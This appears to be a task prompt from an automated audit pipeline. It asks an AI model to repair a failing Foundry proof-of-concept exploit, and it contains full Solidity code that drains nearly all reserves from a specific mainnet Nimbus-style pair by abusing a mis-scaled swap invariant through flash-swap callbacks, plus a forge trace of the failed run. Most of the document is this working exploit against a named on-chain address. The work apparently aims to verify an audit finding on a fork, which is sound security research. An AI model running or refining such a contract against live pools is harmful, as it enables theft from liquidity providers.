You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap invariant is weakened by a 100x scaling mismatch, allowing near-total reserve drains
- claim: The swap check multiplies post-swap balances by 10000 and subtracts a 15 bp fee, but compares against `_reserve0 * _reserve1 * 1000**2` instead of `10000**2`. This reduces the required post-swap product to roughly 1% of the intended invariant.
- impact: An attacker can satisfy the `K` check while extracting nearly the entire opposite-side reserve with minimal input, causing direct and repeatable pool drains.
- exploit_paths: ["Seed or target a pool with meaningful reserves.", "Call `swap()` with a small input on one side and request almost all liquidity from the other side.", "Because the right-hand side of the invariant is under-scaled by 100x, the transaction passes even though the real constant-product condition is badly violated."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INimbusCalleeLike {
    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FlawVerifier is INimbusCalleeLike {
    address public constant TARGET = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62;

    string internal constant EXPLOIT_PATH_0 = "Seed or target a pool with meaningful reserves.";
    string internal constant EXPLOIT_PATH_1 = "Call swap() with a small input on one side and request almost all liquidity from the other side.";
    string internal constant EXPLOIT_PATH_2 =
        "Because the right-hand side of the invariant is under-scaled by 100x, the transaction passes even though the real constant-product condition is badly violated.";

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    struct CallbackPlan {
        address repayToken;
        uint256 repayAmount;
    }

    bool public attempted;
    bool public hypothesisValidated;
    string public pathUsed;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        INimbusPairLike pair = INimbusPairLike(TARGET);
        address token0 = pair.token0();
        address token1 = pair.token1();
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();

        // Exploit path stage 1: Seed or target a pool with meaningful reserves.
        // If either reserve is empty at the specified fork block, the drain path is mechanically infeasible.
        if (reserve0 <= 1 || reserve1 <= 1) {
            pathUsed = string.concat(EXPLOIT_PATH_0, " infeasible on this fork: insufficient reserves.");
            _selectProfitToken(token0, token1);
            _updateProfit();
            return;
        }

        // Snapshot balances so we can confirm each drain direction produces attacker-controlled profit.
        uint256 token0Before = _balanceOf(token0, address(this));
        uint256 token1Before = _balanceOf(token1, address(this));

        bool drained1 = _drainToken1(reserve0, reserve1, token0, token1);
        if (drained1 && _balanceOf(token1, address(this)) > token1Before) {
            hypothesisValidated = true;
            pathUsed = string.concat(EXPLOIT_PATH_0, " ", EXPLOIT_PATH_1, " ", EXPLOIT_PATH_2);
        }

        // Same exploit causality, opposite direction: if token1 dust is available after the first drain,
        // try the mirrored near-total drain of token0 as an additional realistic repeat action.
        (reserve0, reserve1,) = pair.getReserves();
        bool drained0 = false;
        if (reserve0 > 1 && reserve1 > 1) {
            drained0 = _drainToken0(reserve0, reserve1, token0, token1);
            if (drained0 && _balanceOf(token0, address(this)) > token0Before) {
                hypothesisValidated = true;
                if (bytes(pathUsed).length == 0) {
                    pathUsed = string.concat(EXPLOIT_PATH_0, " ", EXPLOIT_PATH_1, " ", EXPLOIT_PATH_2);
                } else {
                    pathUsed = string.concat(EXPLOIT_PATH_0, " ", EXPLOIT_PATH_1, " Repeated in the opposite direction. ", EXPLOIT_PATH_2);
                }
            }
        }

        if (!hypothesisValidated) {
            pathUsed = "refuted-on-fork: both reserve-drain directions reverted";
        }

        _selectProfitToken(token0, token1);
        _updateProfit();
    }

    function NimbusCall(address sender, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == TARGET, "unauthorized-pair");
        require(sender == address(this), "unauthorized-sender");

        CallbackPlan memory plan = abi.decode(data, (CallbackPlan));
        if (plan.repayAmount > 0) {
            _safeTransfer(plan.repayToken, TARGET, plan.repayAmount);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainToken1(uint112 reserve0, uint112 reserve1, address token0, address) internal returns (bool) {
        uint256 directDust = _availableDust(token0, reserve0);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve0) : directDust;
        if (inputDust == 0 || inputDust >= reserve0) {
            return false;
        }

        uint256 maxToken1Out = useBootstrap
            ? _maxOutBootstrapInput(reserve0, reserve1, inputDust)
            : _maxOutDirectInput(reserve0, reserve1, inputDust);
        if (maxToken1Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            useBootstrap ? inputDust : 0,
            maxToken1Out,
            CallbackPlan({repayToken: token0, repayAmount: inputDust})
        );
    }

    function _drainToken0(uint112 reserve0, uint112 reserve1, address, address token1) internal returns (bool) {
        uint256 directDust = _availableDust(token1, reserve1);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve1) : directDust;
        if (inputDust == 0 || inputDust >= reserve1) {
            return false;
        }

        uint256 maxToken0Out = useBootstrap
            ? _maxOutBootstrapInput(reserve1, reserve0, inputDust)
            : _maxOutDirectInput(reserve1, reserve0, inputDust);
        if (maxToken0Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            maxToken0Out,
            useBootstrap ? inputDust : 0,
            CallbackPlan({repayToken: token1, repayAmount: inputDust})
        );
    }

    function _swapWithBackoff(uint256 amount0Out, uint256 amount1Out, CallbackPlan memory plan) internal returns (bool) {
        INimbusPairLike pair = INimbusPairLike(TARGET);

        uint256 primaryOut = amount0Out > 0 ? amount0Out : amount1Out;
        uint256[6] memory attempts = [
            primaryOut,
            (primaryOut * 9999) / 10000,
            (primaryOut * 999) / 1000,
            (primaryOut * 995) / 1000,
            (primaryOut * 99) / 100,
            (primaryOut * 95) / 100
        ];

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 tryOut = attempts[i];
            if (tryOut == 0) {
                continue;
            }

            uint256 tryAmount0Out = amount0Out > 0 ? tryOut : amount0Out;
            uint256 tryAmount1Out = amount1Out > 0 ? tryOut : amount1Out;

            // Exploit path stage 2: call swap() with a small input on one side and request
            // almost all liquidity from the other side. Using a direct interface call keeps
            // the exploit mechanically aligned with the finding path.
            try pair.swap(tryAmount0Out, tryAmount1Out, address(this), abi.encode(plan)) {
                return true;
            } catch {
            }
        }

        return false;
    }

    function _maxOutBootstrapInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        // Exploit path stage 2: Call swap() with a small input on one side and request almost all
        // liquidity from the other side. When the verifier starts with zero balance, it borrows a
        // dust-sized same-side amount and returns that same dust in the callback so the pair still
        // observes a small real input during this single swap() call.
        // Exploit path stage 3: Because the right-hand side of the invariant is under-scaled by 100x,
        // the transaction passes even though the real constant-product condition is badly violated.
        uint256 denominator = reserveIn * 10000 - inputDust * 15;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _maxOutDirectInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        uint256 denominator = reserveIn * 10000 + inputDust * 9985;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _bootstrapDust(uint256 reserve) internal pure returns (uint256) {
        if (reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _availableDust(address token, uint256 reserve) internal view returns (uint256) {
        uint256 bal = _balanceOf(token, address(this));
        if (bal == 0 || reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust > bal) {
            dust = bal;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _selectProfitToken(address token0, address token1) internal {
        uint256 bal0 = _balanceOf(token0, address(this));
        uint256 bal1 = _balanceOf(token1, address(this));

        if (_isPreferredProfitToken(token0) && bal0 > 0) {
            _profitToken = token0;
            return;
        }
        if (_isPreferredProfitToken(token1) && bal1 > 0) {
            _profitToken = token1;
            return;
        }

        if (bal0 >= bal1) {
            _profitToken = token0;
        } else {
            _profitToken = token1;
        }
    }

    function _updateProfit() internal {
        _profitAmount = _balanceOf(_profitToken, address(this));
    }

    function _isPreferredProfitToken(address token) internal pure returns (bool) {
        return token == WETH || token == USDC || token == USDT || token == DAI || token == WBTC;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        return IERC20Like(token).balanceOf(account);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
a1b3D433Cc23b72f], 269495458733237766 [2.694e17], 0, 0x000000000000000000000000eb58343b36c7528f23caae63a1502402413100490000000000000000000000000000000000000000000000000000000000042774)
    │   │   │   ├─ [3798] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62, 272244 [2.722e5])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000a0ff0e694275023f4986dc3ca12a6eb5d6056c62
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000042774
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) [staticcall]
    │   │   │   └─ ← [Return] 2749400836797382 [2.749e15]
    │   │   ├─ [817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) [staticcall]
    │   │   │   └─ ← [Return] 7011810487612862045579 [7.011e21]
    │   │   ├─ [413] 0x6a1a11e8224670186EB4B6DF9A47a204b616D675::6e81aa63() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   │   ├─ [11398] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, 409)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000a0ff0e694275023f4986dc3ca12a6eb5d6056c62
    │   │   │   │        topic 2: 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000199
    │   │   │   └─ ← [Return] true
    │   │   ├─ [18067] 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365::2a355f7c(000000000000000000000000eb58343b36c7528f23caae63a1502402413100490000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000199)
    │   │   │   ├─ [2817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365) [staticcall]
    │   │   │   │   └─ ← [Return] 38192307884100767422286 [3.819e22]
    │   │   │   └─ ← [Stop]
    │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000009c490c438f3c600000000000000000000000000000000000000000000017c1c6b0851db2b1d8b
    │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004277400000000000000000000000000000000000000000000000003bd70b11e6026060000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Stop]
    │   ├─ [585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 269495458733237766 [2.694e17]
    │   ├─ [585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 269495458733237766 [2.694e17]
    │   ├─ [817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 269495458733237766 [2.694e17]
    │   └─ ← [Stop]
    ├─ [316] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6
    ├─ [585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 269495458733237766 [2.694e17]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13225516 [1.322e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2411)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 858.29ms (164.96ms CPU time)

Ran 1 test suite in 889.21ms (858.29ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 706105)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
